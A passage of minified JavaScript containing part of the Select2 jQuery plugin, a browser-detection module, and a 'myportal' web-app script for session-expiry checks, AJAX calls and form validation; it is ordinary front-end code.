o=this.getPlaceholderOption();this.opts.element.val(o?o.val():""),this.selection.find(".select2-chosen").empty(),this.selection.removeData("select2-data"),this.setPlaceholder(),!1!==e&&(this.opts.element.trigger({type:"select2-removed",val:this.id(i),choice:i}),this.triggerChange({removed:i}))}},initSelection:function(){if(this.isPlaceholderOptionSelected())this.updateSelection(null),this.close(),this.setPlaceholder();else{var t=this;this.opts.initSelection.call(null,this.opts.element,(function(i){i!==e&&null!==i&&(t.updateSelection(i),t.close(),t.setPlaceholder())}))}},isPlaceholderOptionSelected:function(){var t;return!!this.getPlaceholder()&&((t=this.getPlaceholderOption())!==e&&t.prop("selected")||""===this.opts.element.val()||this.opts.element.val()===e||null===this.opts.element.val())},prepareOpts:function(){var e=this.parent.prepareOpts.apply(this,arguments),i=this;return"select"===e.element.get(0).tagName.toLowerCase()?e.initSelection=function(t,e){var a=t.find("option").filter((function(){return this.selected}));e(i.optionToData(a))}:"data"in e&&(e.initSelection=e.initSelection||function(i,a){var n=i.val(),r=null;e.query({matcher:function(t,i,a){var s=o(n,e.id(a));return s&&(r=a),s},callback:t.isFunction(a)?function(){a(r)}:t.noop})}),e},getPlaceholder:function(){return this.select&&this.getPlaceholderOption()===e?e:this.parent.getPlaceholder.apply(this,arguments)},setPlaceholder:function(){var t=this.getPlaceholder();if(this.isPlaceholderOptionSelected()&&t!==e){if(this.select&&this.getPlaceholderOption()===e)return;this.selection.find(".select2-chosen").html(this.opts.escapeMarkup(t)),this.selection.addClass("select2-default"),this.container.removeClass("select2-allowclear")}},postprocessResults:function(t,e,i){var a=0,n=this;if(this.findHighlightableChoices().each2((function(t,e){return o(n.id(e.data("select2-data")),n.opts.element.val())?(a=t,!1):void 0})),!1!==i&&(!0===e&&a>=0?this.highlight(a):this.highlight(0)),!0===e){var r=this.opts.minimumResultsForSearch;r>=0&&this.showSearch(w(t.results)>=r)}},showSearch:function(e){this.showSearchInput!==e&&(this.showSearchInput=e,this.dropdown.find(".select2-search").toggleClass("select2-search-hidden",!e),this.dropdown.find(".select2-search").toggleClass("select2-offscreen",!e),t(this.dropdown,this.container).toggleClass("select2-with-searchbox",e))},onSelect:function(t,e){if(this.triggerSelect(t)){var i=this.opts.element.val(),a=this.data();this.opts.element.val(this.id(t)),this.updateSelection(t),this.opts.element.trigger({type:"select2-selected",val:this.id(t),choice:t}),this.nextSearchTerm=this.opts.nextSearchTerm(t,this.search.val()),this.close(),e&&e.noFocus||this.focusser.focus(),o(i,this.id(t))||this.triggerChange({added:t,removed:a})}},updateSelection:function(t){var i,a,o=this.selection.find(".select2-chosen");this.selection.data("select2-data",t),o.empty(),null!==t&&(i=this.opts.formatSelection(t,o,this.opts.escapeMarkup)),i!==e&&o.append(i),(a=this.opts.formatSelectionCssClass(t,o))!==e&&o.addClass(a),this.selection.removeClass("select2-default"),this.opts.allowClear&&this.getPlaceholder()!==e&&this.container.addClass("select2-allowclear")},val:function(){var t,i=!1,a=null,o=this,n=this.data();if(0===arguments.length)return this.opts.element.val();if(t=arguments[0],arguments.length>1&&(i=arguments[1]),this.select)this.select.val(t).find("option").filter((function(){return this.selected})).each2((function(t,e){return a=o.optionToData(e),!1})),this.updateSelection(a),this.setPlaceholder(),i&&this.triggerChange({added:a,removed:n});else{if(!t&&0!==t)return void this.clear(i);if(this.opts.initSelection===e)throw new Error("cannot call val() if initSelection() is not defined");this.opts.element.val(t),this.opts.initSelection(this.opts.element,(function(t){o.opts.element.val(t?o.id(t):""),o.updateSelection(t),o.setPlaceholder(),i&&o.triggerChange({added:t,removed:n})}))}},clearSearch:function(){this.search.val(""),this.focusser.val("")},data:function(t){var i,a=!1;return 0===arguments.length?((i=this.selection.data("select2-data"))==e&&(i=null),i):(arguments.length>1&&(a=arguments[1]),void(t?(i=this.data(),this.opts.element.val(t?this.id(t):""),this.updateSelection(t),a&&this.triggerChange({added:t,removed:i})):this.clear(a)))}}),S=x(C,{createContainer:function(){return t(document.createElement("div")).attr({class:"select2-container select2-container-multi"}).html(["<ul class='select2-choices'>","  <li class='select2-search-field'>","    <input type='text' autocomplete='off' autocorrect='off' autocapitalize='off' spellcheck='false' class='select2-input'>","  </li>","</ul>","<div class='select2-drop select2-drop-multi select2-display-none'>","   <ul class='select2-results'>","   </ul>","</div>"].join(""))},prepareOpts:function(){var e=this.parent.prepareOpts.apply(this,arguments),i=this;return"select"===e.element.get(0).tagName.toLowerCase()?e.initSelection=function(t,e){var a=[];t.find("option").filter((function(){return this.selected})).each2((function(t,e){a.push(i.optionToData(e))})),e(a)}:"data"in e&&(e.initSelection=e.initSelection||function(i,a){var r=n(i.val(),e.separator),s=[];e.query({matcher:function(i,a,n){var l=t.grep(r,(function(t){return o(t,e.id(n))})).length;return l&&s.push(n),l},callback:t.isFunction(a)?function(){for(var t=[],i=0;i<r.length;i++)for(var n=r[i],l=0;l<s.length;l++){var c=s[l];if(o(n,e.id(c))){t.push(c),s.splice(l,1);break}}a(t)}:t.noop})}),e},selectChoice:function(t){var e=this.container.find(".select2-search-choice-focus");e.length&&t&&t[0]==e[0]||(e.length&&this.opts.element.trigger("choice-deselected",e),e.removeClass("select2-search-choice-focus"),t&&t.length&&(this.close(),t.addClass("select2-search-choice-focus"),this.opts.element.trigger("choice-selected",t)))},destroy:function(){t("label[for='"+this.search.attr("id")+"']").attr("for",this.opts.element.attr("id")),this.parent.destroy.apply(this,arguments)},initContainer:function(){var e,i=".select2-choices";this.searchContainer=this.container.find(".select2-search-field"),this.selection=e=this.container.find(i);var a=this;this.selection.on("click",".select2-search-choice:not(.select2-locked)",(function(){a.search[0].focus(),a.selectChoice(t(this))})),this.search.attr("id","s2id_autogen"+T()),t("label[for='"+this.opts.element.attr("id")+"']").attr("for",this.search.attr("id")),this.search.on("input paste",this.bind((function(){this.isInterfaceEnabled()&&(this.opened()||this.open())}))),this.search.attr("tabindex",this.elementTabIndex),this.keydowns=0,this.search.on("keydown",this.bind((function(t){if(this.isInterfaceEnabled()){++this.keydowns;var i=e.find(".select2-search-choice-focus"),a=i.prev(".select2-search-choice:not(.select2-locked)"),o=i.next(".select2-search-choice:not(.select2-locked)"),n=d(this.search);if(i.length&&(t.which==F.LEFT||t.which==F.RIGHT||t.which==F.BACKSPACE||t.which==F.DELETE||t.which==F.ENTER)){var r=i;return t.which==F.LEFT&&a.length?r=a:t.which==F.RIGHT?r=o.length?o:null:t.which===F.BACKSPACE?(this.unselect(i.first()),this.search.width(10),r=a.length?a:o):t.which==F.DELETE?(this.unselect(i.first()),this.search.width(10),r=o.length?o:null):t.which==F.ENTER&&(r=null),this.selectChoice(r),p(t),void(r&&r.length||this.open())}if((t.which===F.BACKSPACE&&1==this.keydowns||t.which==F.LEFT)&&0==n.offset&&!n.length)return this.selectChoice(e.find(".select2-search-choice:not(.select2-locked)").last()),void p(t);if(this.selectChoice(null),this.opened())switch(t.which){case F.UP:case F.DOWN:return this.moveHighlight(t.which===F.UP?-1:1),void p(t);case F.ENTER:return this.selectHighlighted(),void p(t);case F.TAB:return this.selectHighlighted({noFocus:!0}),void this.close();case F.ESC:return this.cancel(t),void p(t)}if(t.which!==F.TAB&&!F.isControl(t)&&!F.isFunctionKey(t)&&t.which!==F.BACKSPACE&&t.which!==F.ESC){if(t.which===F.ENTER){if(!1===this.opts.openOnEnter)return;if(t.altKey||t.ctrlKey||t.shiftKey||t.metaKey)return}this.open(),(t.which===F.PAGE_UP||t.which===F.PAGE_DOWN)&&p(t),t.which===F.ENTER&&p(t)}}}))),this.search.on("keyup",this.bind((function(){this.keydowns=0,this.resizeSearch()}))),this.search.on("blur",this.bind((function(e){this.container.removeClass("select2-container-active"),this.search.removeClass("select2-focused"),this.selectChoice(null),this.opened()||this.clearSearch(),e.stopImmediatePropagation(),this.opts.element.trigger(t.Event("select2-blur"))}))),this.container.on("click",i,this.bind((function(e){this.isInterfaceEnabled()&&(t(e.target).closest(".select2-search-choice").length>0||(this.selectChoice(null),this.clearPlaceholder(),this.container.hasClass("select2-container-active")||this.opts.element.trigger(t.Event("select2-focus")),this.open(),this.focusSearch(),e.preventDefault()))}))),this.container.on("focus",i,this.bind((function(){this.isInterfaceEnabled()&&(this.container.hasClass("select2-container-active")||this.opts.element.trigger(t.Event("select2-focus")),this.container.addClass("select2-container-active"),this.dropdown.addClass("select2-drop-active"),this.clearPlaceholder())}))),this.initContainerWidth(),this.opts.element.addClass("select2-offscreen"),this.clearSearch()},enableInterface:function(){this.parent.enableInterface.apply(this,arguments)&&this.search.prop("disabled",!this.isInterfaceEnabled())},initSelection:function(){if(""===this.opts.element.val()&&""===this.opts.element.text()&&(this.updateSelection([]),this.close(),this.clearSearch()),this.select||""!==this.opts.element.val()){var t=this;this.opts.initSelection.call(null,this.opts.element,(function(i){i!==e&&null!==i&&(t.updateSelection(i),t.close(),t.clearSearch())}))}},clearSearch:function(){var t=this.getPlaceholder(),i=this.getMaxSearchWidth();t!==e&&0===this.getVal().length&&!1===this.search.hasClass("select2-focused")?(this.search.val(t).addClass("select2-default"),this.search.width(i>0?i:this.container.css("width"))):this.search.val("").width(10)},clearPlaceholder:function(){this.search.hasClass("select2-default")&&this.search.val("").removeClass("select2-default")},opening:function(){this.clearPlaceholder(),this.resizeSearch(),this.parent.opening.apply(this,arguments),this.focusSearch(),this.updateResults(!0),this.search.focus(),this.opts.element.trigger(t.Event("select2-open"))},close:function(){this.opened()&&this.parent.close.apply(this,arguments)},focus:function(){this.close(),this.search.focus()},isFocused:function(){return this.search.hasClass("select2-focused")},updateSelection:function(e){var i=[],o=[],n=this;t(e).each((function(){a(n.id(this),i)<0&&(i.push(n.id(this)),o.push(this))})),e=o,this.selection.find(".select2-search-choice").remove(),t(e).each((function(){n.addSelectedChoice(this)})),n.postprocessResults()},tokenize:function(){var t=this.search.val();null!=(t=this.opts.tokenizer.call(this,t,this.data(),this.bind(this.onSelect),this.opts))&&t!=e&&(this.search.val(t),t.length>0&&this.open())},onSelect:function(t,e){this.triggerSelect(t)&&(this.addSelectedChoice(t),this.opts.element.trigger({type:"selected",val:this.id(t),choice:t}),(this.select||!this.opts.closeOnSelect)&&this.postprocessResults(t,!1,!0===this.opts.closeOnSelect),this.opts.closeOnSelect?(this.close(),this.search.width(10)):this.countSelectableResults()>0?(this.search.width(10),this.resizeSearch(),this.getMaximumSelectionSize()>0&&this.val().length>=this.getMaximumSelectionSize()&&this.updateResults(!0),this.positionDropdown()):(this.close(),this.search.width(10)),this.triggerChange({added:t}),e&&e.noFocus||this.focusSearch())},cancel:function(){this.close(),this.focusSearch()},addSelectedChoice:function(i){var a,o,n=!i.locked,r=t("<li class='select2-search-choice'>    <div></div>    <a href='#' onclick='return false;' class='select2-search-choice-close' tabindex='-1'></a></li>"),s=t("<li class='select2-search-choice select2-locked'><div></div></li>"),l=n?r:s,c=this.id(i),d=this.getVal();(a=this.opts.formatSelection(i,l.find("div"),this.opts.escapeMarkup))!=e&&l.find("div").replaceWith("<div>"+a+"</div>"),(o=this.opts.formatSelectionCssClass(i,l.find("div")))!=e&&l.addClass(o),n&&l.find(".select2-search-choice-close").on("mousedown",p).on("click dblclick",this.bind((function(e){this.isInterfaceEnabled()&&(t(e.target).closest(".select2-search-choice").fadeOut("fast",this.bind((function(){this.unselect(t(e.target)),this.selection.find(".select2-search-choice-focus").removeClass("select2-search-choice-focus"),this.close(),this.focusSearch()}))).dequeue(),p(e))}))).on("focus",this.bind((function(){this.isInterfaceEnabled()&&(this.container.addClass("select2-container-active"),this.dropdown.addClass("select2-drop-active"))}))),l.data("select2-data",i),l.insertBefore(this.searchContainer),d.push(c),this.setVal(d)},unselect:function(e){var i,o,n=this.getVal();if(0===(e=e.closest(".select2-search-choice")).length)throw"Invalid argument: "+e+". Must be .select2-search-choice";if(i=e.data("select2-data")){for(;(o=a(this.id(i),n))>=0;)n.splice(o,1),this.setVal(n),this.select&&this.postprocessResults();var r=t.Event("select2-removing");r.val=this.id(i),r.choice=i,this.opts.element.trigger(r),r.isDefaultPrevented()||(this.opts.element.trigger({type:"select2-removed",val:this.id(i),choice:i}),this.triggerChange({removed:i}))}},postprocessResults:function(t,e,i){var o=this.getVal(),n=this.results.find(".select2-result"),r=this.results.find(".select2-result-with-children"),s=this;n.each2((function(t,e){a(s.id(e.data("select2-data")),o)>=0&&(e.addClass("select2-selected"),e.find(".select2-result-selectable").addClass("select2-selected"))})),r.each2((function(t,e){e.is(".select2-result-selectable")||0!==e.find(".select2-result-selectable:not(.select2-selected)").length||e.addClass("select2-selected")})),-1==this.highlight()&&!1!==i&&s.highlight(0),!this.opts.createSearchChoice&&!n.filter(".select2-result:not(.select2-selected)").length>0&&(!t||t&&!t.more&&0===this.results.find(".select2-no-results").length)&&$(s.opts.formatNoMatches,"formatNoMatches")&&this.results.append("<li class='select2-no-results'>"+s.opts.formatNoMatches(s.search.val())+"</li>")},getMaxSearchWidth:function(){return this.selection.width()-r(this.search)},resizeSearch:function(){var t,e,i,a,o=r(this.search);t=u(this.search)+10,e=this.search.offset().left,t>(a=(i=this.selection.width())-(e-this.selection.offset().left)-o)&&(a=i-o),40>a&&(a=i-o),0>=a&&(a=t),this.search.width(Math.floor(a))},getVal:function(){var t;return this.select?null===(t=this.select.val())?[]:t:n(t=this.opts.element.val(),this.opts.separator)},setVal:function(e){var i;this.select?this.select.val(e):(i=[],t(e).each((function(){a(this,i)<0&&i.push(this)})),this.opts.element.val(0===i.length?"":i.join(this.opts.separator)))},buildChangeDetails:function(t,e){e=e.slice(0),t=t.slice(0);for(var i=0;i<e.length;i++)for(var a=0;a<t.length;a++)o(this.opts.id(e[i]),this.opts.id(t[a]))&&(e.splice(i,1),i--,t.splice(a,1),a--);return{added:e,removed:t}},val:function(i,a){var o,n=this;if(0===arguments.length)return this.getVal();if((o=this.data()).length||(o=[]),!i&&0!==i)return this.opts.element.val(""),this.updateSelection([]),this.clearSearch(),void(a&&this.triggerChange({added:this.data(),removed:o}));if(this.setVal(i),this.select)this.opts.initSelection(this.select,this.bind(this.updateSelection)),a&&this.triggerChange(this.buildChangeDetails(o,this.data()));else{if(this.opts.initSelection===e)throw new Error("val() cannot be called if initSelection() is not defined");this.opts.initSelection(this.opts.element,(function(e){var i=t.map(e,n.id);n.setVal(i),n.updateSelection(e),n.clearSearch(),a&&n.triggerChange(n.buildChangeDetails(o,n.data()))}))}this.clearSearch()},onSortStart:function(){if(this.select)throw new Error("Sorting of elements is not supported when attached to <select>. Attach to <input type='hidden'/> instead.");this.search.width(0),this.searchContainer.hide()},onSortEnd:function(){var e=[],i=this;this.searchContainer.show(),this.searchContainer.appendTo(this.searchContainer.parent()),this.resizeSearch(),this.selection.find(".select2-search-choice").each((function(){e.push(i.opts.id(t(this).data("select2-data")))})),this.setVal(e),this.triggerChange()},data:function(e,i){var a,o,n=this;return 0===arguments.length?this.selection.find(".select2-search-choice").map((function(){return t(this).data("select2-data")})).get():(o=this.data(),e||(e=[]),a=t.map(e,(function(t){return n.opts.id(t)})),this.setVal(a),this.updateSelection(e),this.clearSearch(),void(i&&this.triggerChange(this.buildChangeDetails(o,this.data()))))}}),t.fn.select2=function(){var i,o,n,r,s,l=Array.prototype.slice.call(arguments,0),c=["val","destroy","opened","open","close","focus","isFocused","container","dropdown","onSortStart","onSortEnd","enable","disable","readonly","positionDropdown","data","search"],d=["opened","isFocused","container","dropdown"],p=["val","data"],u={search:"externalSearch"};return this.each((function(){if(0===l.length||"object"==typeof l[0])(i=0===l.length?{}:t.extend({},l[0])).element=t(this),"select"===i.element.get(0).tagName.toLowerCase()?s=i.element.prop("multiple"):(s=i.multiple||!1,"tags"in i&&(i.multiple=s=!0)),(o=s?new S:new k).init(i);else{if("string"!=typeof l[0])throw"Invalid arguments to select2 plugin: "+l;if(a(l[0],c)<0)throw"Unknown method: "+l[0];if(r=e,(o=t(this).data("select2"))===e)return;if("container"===(n=l[0])?r=o.container:"dropdown"===n?r=o.dropdown:(u[n]&&(n=u[n]),r=o[n].apply(o,l.slice(1))),a(l[0],d)>=0||a(l[0],p)&&1==l.length)return!1}})),r===e?this:r},t.fn.select2.defaults={width:"copy",loadMorePadding:0,closeOnSelect:!0,openOnEnter:!0,containerCss:{},dropdownCss:{},containerCssClass:"",dropdownCssClass:"",formatResult:function(t,e,i,a){var o=[];return f(t.text,i.term,o,a),o.join("")},formatSelection:function(t,i,a){return t?a(t.text):e},sortResults:function(t){return t},formatResultCssClass:function(){return e},formatSelectionCssClass:function(){return e},formatNoMatches:function(){return"No matches found"},formatInputTooShort:function(t,e){var i=e-t.length;return"Please enter "+i+" more character"+(1==i?"":"s")},formatInputTooLong:function(t,e){var i=t.length-e;return"Please delete "+i+" character"+(1==i?"":"s")},formatSelectionTooBig:function(t){return"You can only select "+t+" item"+(1==t?"":"s")},formatLoadMore:function(){return"Loading more results..."},formatSearching:function(){return"Searching..."},minimumResultsForSearch:0,minimumInputLength:0,maximumInputLength:null,maximumSelectionSize:0,id:function(t){return t.id},matcher:function(t,e){return i(""+e).toUpperCase().indexOf(i(""+t).toUpperCase())>=0},separator:",",tokenSeparators:[],tokenizer:function(t,i,a,n){var r,s,l,c,d,p=t,u=!1;if(!n.createSearchChoice||!n.tokenSeparators||n.tokenSeparators.length<1)return e;for(;;){for(s=-1,l=0,c=n.tokenSeparators.length;c>l&&(d=n.tokenSeparators[l],!((s=t.indexOf(d))>=0));l++);if(0>s)break;if(r=t.substring(0,s),t=t.substring(s+d.length),r.length>0&&(r=n.createSearchChoice.call(this,r,i))!==e&&null!==r&&n.id(r)!==e&&null!==n.id(r)){for(u=!1,l=0,c=i.length;c>l;l++)if(o(n.id(r),n.id(i[l]))){u=!0;break}u||a(r)}}return p!==t?t:void 0},escapeMarkup:m,blurOnChange:!1,selectOnBlur:!1,adaptContainerCssClass:function(t){return t},adaptDropdownCssClass:function(){return null},nextSearchTerm:function(){return e}},t.fn.select2.ajaxDefaults={transport:t.ajax,params:{type:"GET",cache:!1,dataType:"json"}},window.Select2={query:{ajax:g,local:v,tags:y},util:{debounce:c,markMatch:f,escapeMarkup:m,stripDiacritics:i},class:{abstract:C,single:k,multi:S}}}}(jQuery),function(t){"function"==typeof define&&define.amd?define(["jquery"],(function(e){return t(e)})):"object"==typeof module&&"object"==typeof module.exports?module.exports=t(require("jquery")):t(window.jQuery)}((function(t){"use strict";function e(t){void 0===t&&(t=window.navigator.userAgent),t=t.toLowerCase();var e=/(edge)\/([\w.]+)/.exec(t)||/(opr)[\/]([\w.]+)/.exec(t)||/(chrome)[ \/]([\w.]+)/.exec(t)||/(iemobile)[\/]([\w.]+)/.exec(t)||/(version)(applewebkit)[ \/]([\w.]+).*(safari)[ \/]([\w.]+)/.exec(t)||/(webkit)[ \/]([\w.]+).*(version)[ \/]([\w.]+).*(safari)[ \/]([\w.]+)/.exec(t)||/(webkit)[ \/]([\w.]+)/.exec(t)||/(opera)(?:.*version|)[ \/]([\w.]+)/.exec(t)||/(msie) ([\w.]+)/.exec(t)||t.indexOf("trident")>=0&&/(rv)(?::| )([\w.]+)/.exec(t)||t.indexOf("compatible")<0&&/(mozilla)(?:.*? rv:([\w.]+)|)/.exec(t)||[],i=/(ipad)/.exec(t)||/(ipod)/.exec(t)||/(windows phone)/.exec(t)||/(iphone)/.exec(t)||/(kindle)/.exec(t)||/(silk)/.exec(t)||/(android)/.exec(t)||/(win)/.exec(t)||/(mac)/.exec(t)||/(linux)/.exec(t)||/(cros)/.exec(t)||/(playbook)/.exec(t)||/(bb)/.exec(t)||/(blackberry)/.exec(t)||[],a={},o={browser:e[5]||e[3]||e[1]||"",version:e[2]||e[4]||"0",versionNumber:e[4]||e[2]||"0",platform:i[0]||""};if(o.browser&&(a[o.browser]=!0,a.version=o.version,a.versionNumber=parseInt(o.versionNumber,10)),o.platform&&(a[o.platform]=!0),(a.android||a.bb||a.blackberry||a.ipad||a.iphone||a.ipod||a.kindle||a.playbook||a.silk||a["windows phone"])&&(a.mobile=!0),(a.cros||a.mac||a.linux||a.win)&&(a.desktop=!0),(a.chrome||a.opr||a.safari)&&(a.webkit=!0),a.rv||a.iemobile){var n="msie";o.browser=n,a[n]=!0}if(a.edge){delete a.edge;var r="msedge";o.browser=r,a[r]=!0}if(a.safari&&a.blackberry){var s="blackberry";o.browser=s,a[s]=!0}if(a.safari&&a.playbook){var l="playbook";o.browser=l,a[l]=!0}if(a.bb){var c="blackberry";o.browser=c,a[c]=!0}if(a.opr){var d="opera";o.browser=d,a[d]=!0}if(a.safari&&a.android){var p="android";o.browser=p,a[p]=!0}if(a.safari&&a.kindle){var u="kindle";o.browser=u,a[u]=!0}if(a.safari&&a.silk){var h="silk";o.browser=h,a[h]=!0}return a.name=o.browser,a.platform=o.platform,a}return window.jQBrowser=e(window.navigator.userAgent),window.jQBrowser.uaMatch=e,t&&(t.browser=window.jQBrowser),window.jQBrowser})),window.console||(window.console={}),window.console.log||(window.console.log=function(){}),window[void 0]=window[void 0],myportal=function(){var ua=navigator.userAgent.toLowerCase(),isOpera=ua.indexOf("opera")>-1,isSafari=/webkit|khtml/.test(ua),isIE=!isOpera&&ua.indexOf("msie")>-1,isIE7=!isOpera&&ua.indexOf("msie 7")>-1,isGecko=!isSafari&&ua.indexOf("gecko")>-1,isWindows=-1!=ua.indexOf("windows")||-1!=ua.indexOf("win32"),isMac=-1!=ua.indexOf("macintosh")||-1!=ua.indexOf("mac os x"),isLinux=-1!=ua.indexOf("linux"),isSecure=0===window.location.href.toLowerCase().indexOf("https"),isStrict="CSS1Compat"==document.compatMode,server_name;function namespace(ns){var a=ns,i,j,o=null,d=a.split("."),root=d[0];for(eval("if (typeof "+root+' == "undefined"){'+root+" = {};} o = "+root+";"),j=1;j<d.length;++j)o[d[j]]=o[d[j]]||{},o=o[d[j]]}return{init:function(){if(isIE&&!isIE7)try{document.execCommand("BackgroundImageCache",!1,!0)}catch(t){}server_name=window.location.protocol+"//"+window.location.hostname},isOpera:function(){return isOpera},isSafari:function(){return isSafari},isGecko:function(){return isGecko},isIE:function(){return isIE},isIE7:function(){return isIE7},isWin:function(){return isWin},isMac:function(){return isMac},isLinux:function(){return isLinux},getServerName:function(){return server_name},namespace:function(t){return namespace(t)},version:"1.0"}}(),myportal.init(),myportal.namespace("myportal.app"),myportal.app=function(){var t="",e=!1,i=0;return{isUploading:!1,translations:new Array,filescache:{fileurls:[],filetypes:[],fileids:[],brokenfiles:[]},init:function(){},clearCheckSessionTimer:function(){window.clearTimeout(t)},checkSessionExpiration:function(){e||myportal.app.ajax(checkSessionExpirationUrl,{type:"POST",data:{},dataType:"json",success:function(t){if(t.success)if(t.data.expired)myportal.app.clearCheckSessionTimer(),e=!0,logourRedirectUrl?$(location).attr("href",logourRedirectUrl):($(".modal").modal("hide"),$("#tl-relogin-modal").modal({keyboard:!1,backdrop:"static"}),$(window).off("focus"));else{var i=t.data.newSessionLifeTime;myportal.app.initializeCheckSessionTimer(i)}}},!1)},initializeCheckSessionTimer:function(t){myportal.app.clearCheckSessionTimer(),myportal.app.sessionTimer(t)},getCurrentTimestampInSeconds:function(){return parseInt((new Date).getTime()/1e3)},loadSessionEvents:function(){$(window).focus((function(){myportal.app.getExpiredTimestamp()<myportal.app.getCurrentTimestampInSeconds()&&(myportal.app.clearCheckSessionTimer(),myportal.app.checkSessionExpiration())}))},getExpiredTimestamp:function(){return i},setExpiredTimestamp:function(t){i=t},sessionTimer:function(e){var i=myportal.app.getCurrentTimestampInSeconds();myportal.app.setExpiredTimestamp(i+e),t=setTimeout((function e(){myportal.app.getExpiredTimestamp()<myportal.app.getCurrentTimestampInSeconds()?myportal.app.checkSessionExpiration():t=setTimeout(e,1e3)}),1e3)},error:function(t,e){alert(decodeURIComponent(t)),e&&alert(e)},genericErrorHandler:function(t){var e,i=myportal.app.translate("generic-error");void 0!==t.responseJSON?e=t.responseJSON:void 0!==t.responseText&&(e=$.parseJSON(t.responseText)),void 0!==e&&(i=decodeURIComponent(e.message)),myportal.app.notify({type:"error",message:i})},parseResponse:function(t){try{if(!$.parseJSON(t).success){if(!$.parseJSON(t))throw exception();myportal.app.error($.parseJSON(t).message)}}catch(t){myportal.app.error("Some error occurred")}return $.parseJSON(t).data},translate:function(t){return myportal.app.translations[t]},ajax:function(t,e,i){return void 0===e&&(e={}),void 0===i&&(i=!0),i&&$("#tl-loading-pane").show(),void 0===e.complete&&$.extend(e,{complete:function(t){$("#tl-loading-pane").hide()}}),void 0===e.error&&$.extend(e,{error:function(t,e,i){var a="";(response=$.parseJSON(t.responseText))&&(a=decodeURIComponent(response.message)),0!=t.readyState&&myportal.app.error("Oops, something went wrong! Please try again",a)}}),$.ajax(t,e)},printElement:function(t,e,i){var a,o=t.cloneNode(!0);(a=document.getElementById("printSection"))||((a=document.createElement("div")).id="printSection",document.body.appendChild(a));!0!==e?a.innerHTML="":!0===e&&("string"==typeof i?a.innerHTML+=i:"object"==typeof i&&a.appendChlid(i)),a.appendChild(o)},encodeHTML:function(t){return t.toString().split("&").join("&amp;").split("<").join("&lt;").split('"').join("&quot;").split("'").join("&#39;")},validationSoFar:function(t){if(void 0!==myportal.app.submitForm[t]){var e=!0;for(var i in myportal.app.submitForm[t])if(0==myportal.app.submitForm[t][i]){e=!1;break}return e}return!0},validationAddErrorMessage:function(t,e){if("editor-wysiwyg"==t)$("#editor-wysiwyg-control-group").addClass("error"),$("#editor-wysiwyg-control-group").find(".help-block:first").html("<span class='help-inline'>"+e+"</span>"),$("#editor-wysiwyg-control-group").show();else{1===$("#"+t).parents(".control-group").find("input").not(".select2-input").size()?$("#"+t).parents(".control-group").eq(0).hasClass("error")||($("#"+t).parents(".control-group").eq(0).addClass("error"),$subNotes=$("#"+t).closest(".controls").find(".help-block:first").children("sub").html(),"branch-name"==t&&$("#"+t).parents(".control-group").eq(0).addClass("branchname-error"),null!=$subNotes?$("#"+t).closest(".controls").find(".help-block:first").html("<span class='help-inline'>"+e+"</span><br/><sub>"+$subNotes+"</sub>"):$("#"+t).closest(".controls").find(".help-block:first").html("<span class='help-inline'>"+e+"</span>")):($subNotes=$("#"+t).closest(".controls").find(".help-block:first").children("sub").html(),null!=$subNotes?$("#"+t).closest(".controls").find(".help-block:first").html("<span class='help-inline help-"+t+"'>"+e+"</span><br/><sub>"+$subNotes+"</sub>"):$("#"+t).closest(".controls").find(".help-block:first").append("<span class='help-inline help-"+t+"'>"+e+"</span>"),$("#"+t).is("select")&&$("#"+t).parents(".control-group").eq(0).addClass("error"));var i=$("#"+t).parents(".control-group[data-section-hidden]").attr("data-section-hidden");i&&($("#"+t).parents(".control-group[data-section-hidden]").addClass("error"),$("#"+t).parents(".control-group[data-section-hidden]").find(".help-block").show(),$("#"+t).parents(".control-group[data-section-hidden]").stop(),$("#"+i).stop(),$("#"+i).hide(),$("#"+t).parents(".control-group[data-section-hidden]").show(),sectionStayOpen(i,!0),"control-group-show-key"==i&&($("#control-group-max-redemptions").fadeIn(10),sectionStayOpen("control-group-show-key",!0))),"group-redemptions"==t&&($("#control-group-key").show(),$("#control-group-key").addClass("error"),$("#control-group-show-key").hide(),$("#control-group-max-redemptions").fadeIn(10),$("#control-group-max-redemptions").find(".help-block").show(),sectionStayOpen("control-group-show-key",!0)),$(document).on("input keyup keypress",".error input",(function(){var t=$(this).parents("[data-section-hidden]");t.hasClass("error")&&(t.removeClass("error"),t.find(".help-block").hide()),$(this).is("#group-redemptions")&&($("#control-group-key").removeClass("error"),$("#control-group-key").find(".help-block").hide(),$("#control-group-max-redemptions").removeClass("error"),$("#control-group-max-redemptions").find(".help-block").hide())})),$("#"+t).focus()}},validationClearErrorMessage:function(t){"editor-wysiwyg"==t?$("#editor-wysiwyg-control-group").hasClass("error")&&($("#editor-wysiwyg-control-group").removeClass("error"),$("#editor-wysiwyg-control-group").find(".help-block:first").empty(),$("#editor-wysiwyg-control-group").hide()):1===$("#"+t).parents(".control-group").find("input").not(".select2-input").size()?$("#"+t).parents(".control-group").eq(0).hasClass("error")&&($subNotes=$("#"+t).closest(".controls").find(".help-block:first").children("sub").html(),null!=$subNotes?$("#"+t).closest(".controls").find(".help-block:first").html("<sub>"+$subNotes+"</sub>"):$("#"+t).closest(".controls").find(".help-block:first").empty(),$("#"+t).parents(".control-group").eq(0).removeClass("error")):($subNotes=$("#"+t).closest(".controls").find(".help-block:first").children("sub").html(),null!=$subNotes?$("#"+t).closest(".controls").find(".help-block:first").html("<sub>"+$subNotes+"</sub>"):$("#"+t).closest(".controls").find(".help-inline.help-"+t).remove(),$("#"+t).is("select")&&showSelect2?$("#s2id_"+t+" .select2-choices").removeClass("error-input"):$("#"+t).removeClass("error-input"))},validateMandatory:function(t,e){"checkbox"!=$("#"+t).attr("type")&&""==$.trim($("#"+t).val())||"checkbox"==$("#"+t).attr("type")&&0==$("#"+t).is(":checked")?(myportal.app.submitForm[t].mandatory=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].mandatory=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateMaxLength:function(t,e,i){""!=$.trim($("#"+t).val())&&$("#"+t).val().length>i?(myportal.app.submitForm[t].maxlength=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].maxlength=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateMaxLengthSelect2:function(t,e,i){for(var a=$.trim($("#"+t).val()).split(","),o=$("#"+t).select2("data"),n="",r=0;r<o.length;r++){var 